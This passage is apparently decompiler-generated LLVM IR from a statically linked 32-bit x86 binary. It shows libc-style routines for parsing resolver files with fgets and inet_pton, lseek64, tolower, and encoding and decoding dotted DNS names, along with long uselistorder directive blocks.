  br i1 %tmp85, label %dec_label_pc_8054001, label %dec_label_pc_80541ab.outer.backedge

dec_label_pc_80541ab.outer.backedge:              ; preds = %dec_label_pc_8054168, %dec_label_pc_805418a, %dec_label_pc_8054183
  %v0_80541ab120 = load i32, i32* @edx, align 4
  %v3_80541b5121 = call i32 @fgets(i32 %v4_80541b1, i32 %stack_var_4.0, i32 %v0_80541ab120)
  store i32 %v3_80541b5121, i32* @eax, align 4
  %v1_80541bd122 = icmp eq i32 %v3_80541b5121, 0
  %v1_80541bf123 = icmp eq i1 %v1_80541bd122, false
  br i1 %v1_80541bf123, label %dec_label_pc_80540ac.lr.ph, label %dec_label_pc_80541c5

dec_label_pc_8054183:                             ; preds = %dec_label_pc_8054161
  br i1 %v1_8054188, label %dec_label_pc_80541ab.outer.backedge, label %dec_label_pc_805418a

dec_label_pc_805418a:                             ; preds = %dec_label_pc_8054183
  %v0_805418a = load i32, i32* @ecx, align 4
  %v0_805418f = load i32, i32* @ebx, align 4
  %v1_805418f = inttoptr i32 %v0_805418f to i32*
  %v2_805418f = load i32, i32* %v1_805418f, align 4
  %v4_8054193 = inttoptr i32 %v2_805418f to i8*
  %v5_8054193 = call i32 @inet_pton(i32 10, i8* %v4_8054193, i32 %stack_var_-36.0, i32 %v0_805418a)
  store i32 %v5_8054193, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8054193, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_805402e, label %dec_label_pc_80541ab.outer.backedge

dec_label_pc_80541c5:                             ; preds = %dec_label_pc_80541ab.outer.backedge, %dec_label_pc_8054095, %dec_label_pc_80541ab.backedge, %dec_label_pc_805405a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805405a ], [ 1, %dec_label_pc_8054095 ], [ 2, %dec_label_pc_80541ab.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_80541ab.backedge ]
  br i1 %v12_8053f54, label %dec_label_pc_80541e5, label %dec_label_pc_80541cc

dec_label_pc_80541cc:                             ; preds = %dec_label_pc_80541c5
  %v1_80541d3 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80541d3 = call i32 @__GI_fclose(i16* %v1_80541d3)
  store i32 %v2_80541d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80541e5

dec_label_pc_80541e5:                             ; preds = %dec_label_pc_8054118, %dec_label_pc_8053f35, %dec_label_pc_8053f41, %dec_label_pc_8053f5f, %dec_label_pc_8053f72, %dec_label_pc_8053f7e, %dec_label_pc_8053f87, %dec_label_pc_8053fb1, %dec_label_pc_80541c5, %dec_label_pc_80541cc, %dec_label_pc_8053fe7
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80541c5 ], [ %stack_var_-28.1, %dec_label_pc_80541cc ], [ %v2_8053ff6, %dec_label_pc_8053fe7 ], [ 34, %dec_label_pc_8053fb1 ], [ 34, %dec_label_pc_8053f87 ], [ 34, %dec_label_pc_8053f7e ], [ 34, %dec_label_pc_8053f72 ], [ 34, %dec_label_pc_8053f5f ], [ 34, %dec_label_pc_8053f41 ], [ 34, %dec_label_pc_8053f35 ], [ %stack_var_-28.0.ph131, %dec_label_pc_8054118 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8053f20, i32* @ebx, align 4
  store i32 %v0_8053f1f, i32* @esi, align 4
  store i32 %v0_8053f1e, i32* @edi, align 4
  store i32 %v0_8053f1d, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_805415a, { 0, 2, 1 }
  uselistorder i8 %v2_80540cf95, { 1, 2, 0 }
  uselistorder i8* %v1_80540cf94, { 1, 0 }
  uselistorder i32 %v0_80540cf47, { 1, 0 }
  uselistorder i32 %v2_80540f5, { 1, 0 }
  uselistorder i32 %v1_80540ee, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80540f8.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80540e3, { 1, 0 }
  uselistorder i32 %v0_80540e3, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80540d5, { 1, 0 }
  uselistorder i8* %v2_805414e, { 1, 0 }
  uselistorder i32 %v4_80541b1, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8053f72, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053f4d, { 1, 0 }
  uselistorder i32 %v1_8053f30, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 10, 0, 1, 16, 17, 15, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 15, 23, 24, 25, 0, 14, 8, 9, 18, 10, 26, 27, 1, 3, 22, 4, 11, 5, 19, 6, 20, 7, 21, 12, 13, 16, 17, 2 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 14, 0, 1, 13, 2, 22, 15, 16, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_8059eb8, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 97, 0, 98, 21, 22, 99, 101, 3, 55, 54, 2, 102, 103, 6, 104, 4, 105, 5, 106, 126, 8, 57, 56, 7, 76, 77, 107, 78, 79, 80, 81, 82, 83, 135, 84, 42, 43, 44, 95, 136, 128, 129, 137, 120, 119, 9, 41, 100, 108, 85, 86, 87, 88, 89, 10, 90, 91, 11, 92, 93, 94, 109, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 47, 48, 49, 50, 51, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 18, 19, 20, 96, 17, 110, 111, 112, 113, 114, 115, 116, 117, 118, 121, 123, 122, 124, 125, 12, 127, 134, 131, 14, 132, 15, 133, 13, 130, 16 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 10, { 19, 2, 29, 30, 31, 32, 33, 34, 3, 23, 24, 26, 25, 4, 7, 35, 8, 28, 10, 9, 20, 5, 12, 22, 27, 11, 37, 21, 0, 18, 17, 16, 13, 14, 1, 36, 38, 39, 15, 6 }
  uselistorder i32 12, { 91, 92, 93, 0, 94, 18, 27, 95, 111, 22, 21, 4, 99, 5, 6, 7, 8, 9, 10, 11, 96, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 144, 26, 28, 90, 110, 29, 30, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 31, 32, 33, 34, 35, 36, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 23, 143, 100, 101, 102, 103, 145, 85, 1, 2, 86, 87, 12, 13, 88, 3, 97, 98, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 24, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 19, 70, 71, 72, 73, 25, 20, 89, 17, 16, 15, 14, 104, 105, 106, 107, 108, 109 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 5, 4, 10, 11, 12, 13, 14, 1, 7, 2, 8, 3, 0, 15, 9, 6 }
  uselistorder i32 44, { 7, 8, 9, 4, 5, 6, 20, 11, 12, 3, 17, 19, 18, 14, 15, 16, 13, 10, 0, 1, 2 }
  uselistorder i32 36, { 10, 11, 12, 14, 15, 16, 17, 18, 19, 1, 20, 2, 3, 21, 13, 5, 6, 7, 8, 9, 4, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 18, 13, 3, 9, 4, 19, 20, 0, 10, 6, 5, 1, 12, 7, 8, 14, 15, 16, 17, 2, 11 }
  uselistorder i32 -48, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 16, { 104, 103, 10, 105, 106, 29, 4, 107, 30, 108, 75, 76, 116, 117, 118, 119, 120, 121, 128, 122, 123, 124, 125, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 109, 110, 111, 112, 77, 78, 79, 80, 81, 82, 83, 84, 154, 31, 32, 44, 33, 62, 40, 47, 100, 48, 158, 11, 49, 50, 51, 0, 12, 147, 14, 13, 148, 1, 15, 139, 140, 37, 159, 113, 114, 85, 86, 87, 88, 89, 90, 2, 91, 92, 93, 94, 95, 16, 96, 97, 41, 98, 155, 156, 157, 115, 5, 3, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 43, 34, 63, 64, 65, 66, 67, 42, 68, 69, 7, 8, 70, 71, 72, 73, 74, 35, 36, 99, 26, 27, 28, 24, 25, 22, 23, 17, 18, 19, 20, 21, 45, 46, 101, 102, 9, 38, 141, 142, 143, 144, 145, 39, 146, 6, 149, 150, 151, 152, 153 }
  uselistorder i32 8, { 138, 137, 139, 14, 15, 140, 141, 142, 143, 144, 145, 1, 146, 16, 10, 147, 148, 149, 47, 107, 50, 23, 24, 25, 26, 51, 27, 28, 29, 52, 30, 53, 31, 54, 55, 151, 108, 109, 110, 111, 112, 113, 48, 114, 115, 116, 212, 213, 44, 219, 45, 220, 46, 66, 32, 68, 136, 164, 69, 70, 166, 167, 168, 169, 170, 171, 172, 2, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 3, 71, 72, 73, 74, 75, 76, 77, 78, 183, 184, 185, 186, 187, 57, 4, 58, 5, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 56, 205, 206, 6, 207, 208, 209, 210, 7, 211, 158, 159, 17, 218, 152, 153, 18, 19, 67, 117, 118, 119, 120, 122, 123, 124, 121, 125, 126, 127, 128, 33, 34, 129, 130, 131, 132, 133, 134, 20, 214, 215, 216, 154, 155, 156, 157, 150, 217, 79, 80, 81, 82, 22, 59, 60, 61, 83, 84, 0, 62, 85, 86, 87, 88, 89, 90, 91, 21, 92, 93, 94, 49, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 11, 105, 12, 63, 65, 35, 64, 106, 135, 43, 42, 41, 39, 40, 36, 37, 38, 13, 160, 161, 162, 163, 165, 9, 8 }
  uselistorder i32 -32, { 15, 0, 1, 2, 13, 14, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 32, { 76, 27, 77, 78, 26, 31, 83, 46, 84, 85, 86, 44, 45, 64, 24, 94, 32, 53, 55, 56, 59, 25, 57, 58, 1, 0, 2, 3, 47, 4, 54, 5, 6, 7, 8, 9, 10, 28, 81, 79, 80, 65, 66, 29, 67, 68, 69, 70, 71, 72, 73, 11, 74, 75, 48, 92, 93, 82, 91, 60, 61, 62, 63, 35, 12, 49, 50, 13, 51, 30, 15, 14, 37, 36, 33, 38, 16, 17, 19, 18, 39, 21, 20, 40, 42, 23, 22, 41, 87, 88, 89, 90, 43, 34, 52 }
  uselistorder i32 4, { 260, 261, 262, 256, 254, 255, 257, 258, 259, 35, 2, 263, 264, 265, 266, 267, 268, 269, 270, 271, 42, 149, 150, 151, 43, 44, 45, 272, 76, 36, 199, 3, 4, 201, 202, 203, 204, 205, 206, 5, 273, 276, 277, 278, 279, 280, 281, 91, 282, 289, 290, 291, 98, 46, 292, 293, 294, 295, 47, 48, 49, 99, 50, 51, 52, 53, 296, 54, 297, 100, 55, 101, 102, 6, 283, 284, 285, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 83, 217, 369, 218, 370, 371, 377, 378, 0, 383, 384, 385, 372, 77, 125, 165, 166, 373, 374, 375, 376, 7, 152, 153, 154, 155, 156, 103, 241, 242, 243, 92, 308, 309, 310, 311, 157, 158, 159, 160, 161, 93, 8, 162, 163, 379, 381, 322, 323, 324, 325, 326, 327, 9, 328, 329, 330, 331, 332, 333, 334, 335, 320, 321, 167, 84, 168, 169, 170, 171, 172, 173, 174, 10, 176, 175, 336, 82, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 32, 357, 358, 360, 359, 11, 164, 380, 177, 178, 298, 299, 78, 300, 301, 302, 303, 37, 12, 38, 382, 13, 179, 219, 14, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 56, 57, 126, 39, 237, 238, 239, 286, 15, 287, 85, 288, 274, 275, 185, 180, 181, 182, 41, 104, 105, 106, 107, 183, 58, 59, 108, 16, 184, 17, 18, 33, 19, 1, 20, 109, 186, 187, 188, 189, 21, 190, 191, 192, 110, 193, 194, 195, 111, 196, 112, 197, 113, 198, 86, 94, 95, 96, 200, 114, 115, 116, 30, 117, 118, 97, 31, 119, 120, 79, 122, 87, 60, 121, 80, 240, 75, 127, 128, 129, 73, 74, 71, 72, 130, 131, 70, 132, 68, 69, 133, 134, 67, 64, 135, 65, 66, 136, 123, 137, 61, 138, 62, 63, 139, 140, 141, 142, 143, 144, 145, 146, 147, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 81, 304, 305, 306, 307, 312, 34, 22, 313, 23, 88, 89, 124, 314, 90, 24, 25, 315, 316, 317, 318, 26, 40, 27, 28, 319, 29, 361, 362, 363, 364, 365, 366, 367, 368, 386, 387, 388, 148 }
  uselistorder i32* @ebp, { 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 10, 11, 12, 1, 13, 14, 15, 4, 74, 75, 76, 81, 77, 78, 79, 80, 82, 29, 30, 83, 87, 98, 99, 128, 129, 130, 31, 32, 33, 34, 35, 16, 17, 18, 57, 58, 157, 158, 159, 160, 161, 19, 20, 162, 163, 164, 165, 166, 167, 168, 169, 174, 170, 171, 172, 173, 3, 175, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 5, 36, 37, 38, 39, 40, 93, 2, 94, 95, 96, 97, 88, 89, 90, 91, 92, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 7, 8, 9, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 53, 54, 55, 84, 85, 86, 21, 22, 23, 24, 25, 26, 27, 28, 56, 6, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 176, 177, 178, 179 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80541e5, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_80541c5, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80541ab.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054161, { 1, 0 }
  uselistorder label %dec_label_pc_8054145, { 1, 0 }
  uselistorder label %dec_label_pc_8054108, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80540cf.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80540f5, { 1, 0 }
  uselistorder label %dec_label_pc_80540c3, { 1, 0 }
  uselistorder label %dec_label_pc_80540ac, { 1, 0 }
  uselistorder label %dec_label_pc_80540ac.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8054095, { 1, 0 }
  uselistorder label %dec_label_pc_805405a, { 1, 0 }
  uselistorder label %dec_label_pc_8053fb1, { 1, 0 }
  uselistorder label %dec_label_pc_8053f41, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80541f6 = load i32, i32* @ebx, align 4
  store i32 %v0_80541f6, i32* %stack_var_-12, align 4
  %v2_805420a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805420a, i32* %esi.global-to-local, align 4
  %v1_8054221 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054221, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8054221, -4095
  br i1 %tmp18, label %dec_label_pc_805423b, label %dec_label_pc_805422d

dec_label_pc_805422d:                             ; preds = %entry
  %v2_805420e = ashr i32 %arg3, 31
  %v1_805422d = call i32 @__errno_location(i32 %v2_805420e)
  %v0_8054232 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054232 = sub i32 0, %v0_8054232
  %v2_8054234 = inttoptr i32 %v1_805422d to i32*
  store i32 %v1_8054232, i32* %v2_8054234, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805424f.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805423f

dec_label_pc_805423b:                             ; preds = %entry
  %v1_805423b = icmp eq i32 %v1_8054221, 0
  br i1 %v1_805423b, label %dec_label_pc_8054244, label %dec_label_pc_805423f

dec_label_pc_805423f:                             ; preds = %dec_label_pc_805423b, %dec_label_pc_805422d
  %v2_805424f.pre = phi i32 [ %v0_80541f6, %dec_label_pc_805423b ], [ %v2_805424f.pre.pre, %dec_label_pc_805422d ]
  %v0_805423f = phi i32 [ %v1_8054221, %dec_label_pc_805423b ], [ -1, %dec_label_pc_805422d ]
  %v1_8054241 = ashr i32 %v0_805423f, 31
  br label %dec_label_pc_805424c

dec_label_pc_8054244:                             ; preds = %dec_label_pc_805423b
  %v3_8054244 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805424c

dec_label_pc_805424c:                             ; preds = %dec_label_pc_805423f, %dec_label_pc_8054244
  %v2_805424f = phi i32 [ %v2_805424f.pre, %dec_label_pc_805423f ], [ %v0_80541f6, %dec_label_pc_8054244 ]
  %v0_8054252 = phi i32 [ %v0_805423f, %dec_label_pc_805423f ], [ %v3_8054244, %dec_label_pc_8054244 ]
  %storemerge = phi i32 [ %v1_8054241, %dec_label_pc_805423f ], [ %tmp, %dec_label_pc_8054244 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_805424f, i32* @ebx, align 4
  ret i32 %v0_8054252

; uselistorder directives
  uselistorder i32 %v1_8054221, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80541f6, { 1, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 26, 38, 50, 49, 32, 54, 25, 64, 14, 13, 12, 11, 10, 68, 9, 24, 23, 8, 22, 63, 62, 40, 39, 67, 66, 65, 61, 21, 20, 60, 19, 37, 48, 47, 46, 1, 31, 7, 15, 45, 0, 6, 59, 34, 33, 58, 30, 5, 17, 2, 29, 16, 57, 56, 36, 28, 27, 55, 4, 3, 72, 35, 18 }
  uselistorder i32 31, { 20, 21, 15, 22, 23, 29, 30, 24, 25, 11, 2, 3, 0, 1, 10, 28, 16, 17, 18, 6, 7, 4, 5, 12, 8, 9, 26, 27, 19, 13, 14, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_805424c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8054258 = add i32 %arg1, 128
  %v6_8054263 = icmp ugt i32 %v1_8054258, 383
  br i1 %v6_8054263, label %dec_label_pc_805426e, label %dec_label_pc_8054265

dec_label_pc_8054265:                             ; preds = %entry
  %v0_8054265 = load i32, i32* bitcast (i32** @global_var_805a120.215 to i32*), align 32
  %v2_805426a = mul i32 %arg1, 2
  %v3_805426a = add i32 %v0_8054265, %v2_805426a
  %v4_805426a = inttoptr i32 %v3_805426a to i16*
  %v5_805426a = load i16, i16* %v4_805426a, align 2
  %v6_805426a = sext i16 %v5_805426a to i32
  store i32 %v6_805426a, i32* @edx, align 4
  br label %dec_label_pc_805426e

dec_label_pc_805426e:                             ; preds = %entry, %dec_label_pc_8054265
  %v0_805426e = phi i32 [ %arg1, %entry ], [ %v6_805426a, %dec_label_pc_8054265 ]
  ret i32 %v0_805426e

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 80, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 81, 84, 20, 21, 83, 26, 22, 27, 23, 28, 24, 29, 25, 33, 30, 34, 31, 35, 32, 36, 37, 39, 38, 41, 40, 42, 46, 43, 47, 44, 48, 45, 49, 51, 50, 54, 52, 55, 53, 56, 57, 60, 58, 61, 59, 62, 63, 65, 64, 66, 67, 70, 71, 72, 68, 73, 69, 75, 74, 76, 78, 77, 79, 82 }
  uselistorder i32 128, { 18, 11, 13, 2, 3, 6, 12, 7, 8, 14, 4, 9, 10, 15, 0, 16, 17, 5, 1, 19 }
  uselistorder label %dec_label_pc_805426e, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8054275 = load i32, i32* @edi, align 4
  %v0_8054276 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805427d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805427d, i32* @edi, align 4
  %v1_80542dc5 = icmp eq i8* %arg1, null
  br i1 %v1_80542dc5, label %dec_label_pc_80542e5, label %dec_label_pc_80542e0.lr.ph

dec_label_pc_80542e0.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80542e0

dec_label_pc_8054283:                             ; preds = %dec_label_pc_80542e0
  %v5_8054288 = call i32 @__GI_strchr(i8* %v1_80542e0, i32 46)
  %v1_8054292 = icmp eq i32 %v5_8054288, 0
  br i1 %v1_8054292, label %dec_label_pc_805429c, label %dec_label_pc_8054296

dec_label_pc_8054296:                             ; preds = %dec_label_pc_8054283
  %v1_8054298 = load i32, i32* @edi, align 4
  %v2_8054298 = sub i32 %v5_8054288, %v1_8054298
  br label %dec_label_pc_80542aa

dec_label_pc_805429c:                             ; preds = %dec_label_pc_8054283
  %v0_805429f = load i32, i32* @edi, align 4
  %v5_805429f = inttoptr i32 %v0_805429f to i8*
  %v3_80542a0 = call i32 @strlen(i8* %v5_805429f)
  br label %dec_label_pc_80542aa

dec_label_pc_80542aa:                             ; preds = %dec_label_pc_8054296, %dec_label_pc_805429c
  %v0_80542bd = phi i32 [ %v2_8054298, %dec_label_pc_8054296 ], [ %v3_80542a0, %dec_label_pc_805429c ]
  store i32 %v0_80542bd, i32* @esi, align 4
  %v1_80542aa = icmp eq i32 %v0_80542bd, 0
  %v3_80542aa = trunc i32 %v0_80542bd to i8
  br i1 %v1_80542aa, label %dec_label_pc_80542f9, label %dec_label_pc_80542ae

dec_label_pc_80542ae:                             ; preds = %dec_label_pc_80542aa
  %v1_80542b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542b2 = sub i32 %arg3, %v1_80542b2
  %v1_80542b4 = add i32 %v2_80542b2, -1
  %v7_80542b5 = icmp ult i32 %v0_80542bd, %v1_80542b4
  %v1_80542b7 = icmp eq i1 %v7_80542b5, false
  br i1 %v1_80542b7, label %dec_label_pc_80542f9, label %dec_label_pc_80542b9

dec_label_pc_80542b9:                             ; preds = %dec_label_pc_80542ae
  store i32 %arg2, i32* @edx, align 4
  %v4_80542bf = add i32 %v1_80542b2, %arg2
  %v5_80542bf = inttoptr i32 %v4_80542bf to i8*
  store i8 %v3_80542aa, i8* %v5_80542bf, align 1
  %v0_80542c2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80542c2 = add i32 %v0_80542c2, 1
  %v0_80542c4 = load i32, i32* @edx, align 4
  %v2_80542c6 = add i32 %v1_80542c2, %v0_80542c4
  %v0_80542c8 = load i32, i32* @esi, align 4
  %v0_80542c9 = load i32, i32* @edi, align 4
  %v2_80542cb = add i32 %v0_80542c8, %v1_80542c2
  store i32 %v2_80542cb, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_80542c6 to i16*
  %v7_80542cd = call i32 @memcpy(i16* %tmp30, i32 %v0_80542c9, i32 %v0_80542c8)
  %v1_80542d9 = add i32 %v5_8054288, 1
  br i1 %v1_8054292, label %dec_label_pc_80542e5, label %dec_label_pc_80542dc

dec_label_pc_80542dc:                             ; preds = %dec_label_pc_80542b9
  store i32 %v1_80542d9, i32* @edi, align 4
  %v1_80542dc = icmp eq i32 %v1_80542d9, 0
  br i1 %v1_80542dc, label %dec_label_pc_80542e5, label %dec_label_pc_80542e0

dec_label_pc_80542e0:                             ; preds = %dec_label_pc_80542e0.lr.ph, %dec_label_pc_80542dc
  %v0_8054287 = phi i32 [ %v4_805427d, %dec_label_pc_80542e0.lr.ph ], [ %v1_80542d9, %dec_label_pc_80542dc ]
  %v1_80542e0 = inttoptr i32 %v0_8054287 to i8*
  %v2_80542e0 = load i8, i8* %v1_80542e0, align 1
  %v3_80542e0 = icmp eq i8 %v2_80542e0, 0
  %v1_80542e3 = icmp eq i1 %v3_80542e0, false
  br i1 %v1_80542e3, label %dec_label_pc_8054283, label %dec_label_pc_80542e5

dec_label_pc_80542e5:                             ; preds = %dec_label_pc_80542dc, %dec_label_pc_80542e0, %dec_label_pc_80542b9, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_80542f9, label %dec_label_pc_80542ec

dec_label_pc_80542ec:                             ; preds = %dec_label_pc_80542e5
  %v1_80542f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542f0 = add i32 %v1_80542f0, %arg2
  %v3_80542f0 = inttoptr i32 %v2_80542f0 to i8*
  store i8 0, i8* %v3_80542f0, align 1
  %v0_80542f4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80542f4 = add i32 %v0_80542f4, 1
  br label %dec_label_pc_80542fc

dec_label_pc_80542f9:                             ; preds = %dec_label_pc_80542ae, %dec_label_pc_80542aa, %dec_label_pc_80542e5
  br label %dec_label_pc_80542fc

dec_label_pc_80542fc:                             ; preds = %dec_label_pc_80542ec, %dec_label_pc_80542f9
  %storemerge3 = phi i32 [ %v1_80542f4, %dec_label_pc_80542ec ], [ -1, %dec_label_pc_80542f9 ]
  store i32 %v0_8054276, i32* @esi, align 4
  store i32 %v0_8054275, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_80542e0, { 1, 0 }
  uselistorder i32 %v1_80542d9, { 0, 2, 1 }
  uselistorder i32 %v0_80542c8, { 1, 0 }
  uselistorder i1 %v1_8054292, { 1, 0 }
  uselistorder i32 %v5_8054288, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 5, 6, 7, 0, 1, 2, 8, 3, 4 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_80542fc, { 1, 0 }
  uselistorder label %dec_label_pc_80542f9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80542e5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80542e0, { 1, 0 }
  uselistorder label %dec_label_pc_80542aa, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8054306 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_805430f = icmp eq i32 %arg1, 0
  br i1 %v4_805430f, label %dec_label_pc_80543d0, label %dec_label_pc_805431a

dec_label_pc_805431a:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80543b82740 = add i32 %arg2, %arg1
  %v3_80543b82841 = inttoptr i32 %v2_80543b82740 to i8*
  %v4_80543b82942 = load i8, i8* %v3_80543b82841, align 1
  %v1_80543bc3144 = icmp eq i8 %v4_80543b82942, 0
  %v1_80543be3245 = icmp eq i1 %v1_80543bc3144, false
  br i1 %v1_80543be3245, label %dec_label_pc_8054328.lr.ph, label %dec_label_pc_80543c4

dec_label_pc_8054328:                             ; preds = %dec_label_pc_8054328.lr.ph, %dec_label_pc_8054341
